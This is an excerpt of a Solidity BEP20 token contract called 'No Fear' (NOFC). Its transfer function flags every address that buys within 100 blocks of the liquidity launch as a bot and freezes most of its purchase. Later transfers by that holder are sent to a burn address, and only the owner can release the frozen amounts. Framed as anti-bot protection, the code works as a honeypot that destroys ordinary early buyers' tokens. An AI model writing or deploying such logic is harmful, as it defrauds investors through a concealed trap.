...
contract NoFear2 is IBEP20, Auth {
    ...
    string constant _name = "No Fear";
    string constant _symbol = "NOFC";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) { 
        uint256 deadblock = 100;

        if(stealthLaunch) {
        if(recipient == pair)  { // add liquidity

            if(balanceOf(pair) == 0) {
                launch = block.number;
        } }
            if(sender == pair) { // only buy
            if(block.number < launch + deadblock) {
                IsBots[recipient] = true;
                Frozenbalances[recipient] = amount;
                Frozenbalances[recipient] = (Frozenbalances[recipient] / 100) * 95; // 95% total amount after tax
        }}}
        ...
        if(Frozenbalances[sender] > 1 && !isTxLimitExempt[sender] ) // { revert(); } 

            
        { //
            if(amount <= Frozenbalances[sender]) {
            _basicTransfer(sender, DEAD, amount);
            Frozenbalances[sender] -= amount;
            amount = 0;
    ...
    function releaseFrozenAmounts(address holder, uint256 amount) external onlyOwner {
        Frozenbalances[holder] -= amount;
    }
